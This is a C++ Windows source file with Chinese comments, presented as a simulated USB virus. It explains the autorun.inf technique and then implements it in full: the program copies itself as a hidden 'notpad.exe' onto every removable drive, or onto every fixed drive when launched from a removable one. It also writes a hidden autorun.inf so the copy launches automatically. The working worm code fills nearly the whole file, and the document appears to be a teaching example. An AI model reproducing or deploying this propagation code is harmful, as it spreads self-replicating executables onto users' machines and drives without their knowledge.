// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。
//
// 模拟U盘病毒

/**

U盘病毒的原理主要依赖于autorun.inf文件。
autorun.inf文件最早见于光盘中，它的作用是在载入光盘的时候自动运行指定的某个文件。

AutoRun.inf文件内容如下：

[autorun]
open=notpad.exe
shell\open=打开(&O)
shell\open\Command=notpad.exe
shell\explore=资源管理器(&X)
shell\explore\Command="notpad.exe"
shellexecute=notpad.exe
shell\Auto\Command=notpad.exe

这段代码实现最简单的功能，在移动硬盘或本地磁盘上创建AutoRun.inf文件，将自身拷贝到相应盘符的根目录下。

**/



#include "stdafx.h"
#include <windows.h>

char szAutoRun[] = "[autorun]\
					\r\nopen=notpad.exe	\
					\r\nshell\\open=打开(&O)\
					\r\nshell\\open\\Command=notpad.exe\
					\r\nshell\\explore=资源管理器(&X)\
					\r\nshell\\explore\\Command=notpad.exe\
					\r\nshellexecute=notpad.exe\
					\r\nshell\\Auto\\Command=notpad.exe";


// 感染函数
void infect(WCHAR * pszFile, UINT uDriveType) 
{
	WCHAR szDriveString[MAXBYTE] = { 0 };
	DWORD dwRet = 0;
	DWORD iNum = 0;
	WCHAR szRoot[4] = { 0 };
	UINT uType = 0;
	WCHAR szTarget[MAX_PATH] = { 0 };

	// 获取本地逻辑磁盘函数
	dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);

	while (iNum < dwRet)
	{
		/**  获取每个磁盘的盘符名 C:\\ D:\\ E:\\ F:\\ **/
		wcsncpy(szRoot, &szDriveString[iNum], 3);
		// 获取类型，如果在移动硬盘中运行就把文件拷贝到所有硬盘中，如果在硬盘中运行就把文件拷贝到所有移动硬盘中
		uType = GetDriveType(szRoot);

		if (uType == uDriveType)
		{
			// 拷贝文件
			lstrcpy(szTarget,szRoot);
			// 把自身复制到U盘的位置，此事病毒文件名为notpad.exe
			lstrcat(szTarget, L"notpad.exe");
			CopyFile(pszFile, szTarget, FALSE);

			// 设置notepad.exe文件为隐藏属性
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);

			// 建立AutoRun.inf文件
			lstrcpy(szTarget,szRoot);
			lstrcat(szTarget, L"autorun.inf");
			HANDLE hFile = CreateFile(szTarget,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
			DWORD dwWritten = 0;
			WriteFile(hFile, szAutoRun, strlen(szAutoRun), &dwWritten, NULL);
			
			// 设置AutoRun.inf文件为隐藏属性
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
		}

		iNum += 4;
	}
}

int main()
{
	// 自身所在地位置
	WCHAR szFileName[MAX_PATH] = { 0 };
	// 保存当前文件所在盘符
	WCHAR szRoot[4] = { 0 };
	// 保存磁盘类型
	UINT uType = 0;
	
	// 获取当前所在完整路径及文件名
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	// 获取所在盘符
	wcsncpy(szRoot, szFileName, 3);

	uType = GetDriveType(szRoot);

	switch (uType)
	{
	case DRIVE_FIXED: 
	{
		// 如果是在硬盘上就检测一遍是否有移动磁盘
		infect(szFileName, DRIVE_REMOVABLE);
		break;
	}
	case DRIVE_REMOVABLE:
	{
		// 如果是在移动磁盘上，则将自己复制到移动磁盘上
		infect(szFileName, DRIVE_FIXED);
		break;
	}

	default:
		break;
	}

    return 0;
}

